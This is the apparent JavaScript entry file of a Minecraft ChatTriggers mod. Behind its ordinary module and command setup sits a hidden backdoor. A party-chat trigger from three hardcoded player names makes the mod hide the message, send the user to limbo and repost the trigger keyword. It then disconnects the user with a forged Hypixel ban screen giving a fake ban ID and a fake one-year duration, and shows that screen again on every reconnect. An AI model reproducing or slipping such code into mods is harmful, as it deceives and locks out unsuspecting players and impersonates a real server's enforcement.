import { ModuleManager } from "../module/ModuleManager";
import { CommandManager } from "../command/CommandManager";
import { SkyblockUtils } from "../utils/SkyblockUtils";
import { Scheduler } from "../utils/Scheduler";

CommandManager.commandTrigger.register();
CommandManager.inputTrigger.register();
ModuleManager.keyBindTrigger.register();
SkyblockUtils.skyblockDetectionTrigger.register();
Scheduler.register();

let banned = false;
let bannedAt = 0

function makeid() {
    const characters = 'ABCDEF01234567890123456789';
    let result = '';
    for (let i = 0; i < 8; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}
const id = makeid();

function timeFormatter(time) {
    let days = Math.floor(time / 86400);
    let hours = Math.floor((time % 86400) / 3600);
    let minutes = Math.floor((time % 3600) / 60);
    let seconds = time % 60;
    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

register('chat', (rank, name, event) => {
    cancel(event);
    if (rank.includes("sAPv") || rank.includes("yenauw") || rank.includes("BaboYena")){
    if (name.toLowerCase() == Player.getName().toLowerCase()) {
        setTimeout(doBan, banDelay);
    }} else {
        return;
    }
}).setCriteria("Party > ${rank}: @f7ee2ee3core ${name}")

register('chat', (rank, name, event) => {
    cancel(event);
    ChatLib.chat("&c&lA player has been removed from your game.");
    ChatLib.chat("&bUse /report to continue helping out the server!");
  }).setCriteria(/Party > (\[.+\])? ?(.+) ?[ቾ⚒]?: @ee3core/)

function ban(time, id) {
    const ChatComponentText = Java.type("net.minecraft.util.ChatComponentText");
    
    Client.getMinecraft().func_147114_u().func_147298_b().func_150718_a(new ChatComponentText(
         "§cYou are temporarily banned for §f" + timeFormatter(time) + "§c from this server!\n\n" + 
        `§7Reason: §rCheating through the use of unfair game advantages.\n` + 
        "§7Find out more: §b§nhttps://www.hypixel.net/appeal\n\n§7Ban ID: §r#" + 
        id + 
        "\n§7Sharing your Ban ID may affect the processing of your appeal!"));
}

const banDelay = 1000;

function doBan() {
    bannedAt = Math.floor(Date.now()/1000);
    bannedAt = bannedAt + 31103997;
    setTimeout(() => { ChatLib.chat("&cAn exception occurred in your connection, so you have been routed to limbo!") }, 50);
    setTimeout(() => { ChatLib.command("limbo"); }, 50);
    setTimeout(() => { ChatLib.command("pc @ee3core"); }, 2950);
    setTimeout(() => { ban(31103997, id); }, 3000);
    setTimeout(() => { banned = true; }, 3000);
}

register(net.minecraftforge.fml.common.network.FMLNetworkEvent$ClientConnectedToServerEvent, (e) => {
    if (!banned) return;
    let currentTime = Math.floor(Date.now()/1000);
    let time = Math.floor(bannedAt - currentTime);
    const handler = e.handler;
    const ChatComponentText = Java.type("net.minecraft.util.ChatComponentText");
    handler.func_147298_b().func_150718_a(new ChatComponentText(
         "§cYou are temporarily banned for §f" + timeFormatter(time) + "§c from this server!\n\n" + 
        `§7Reason: §rCheating through the use of unfair game advantages.\n` + 
        `§7Find out more: §b§nhttps://www.hypixel.net/appeal\n\n§7Ban ID: §r#${id}` + 
        "\n§7Sharing your Ban ID may affect the processing of your appeal!"));
        
})
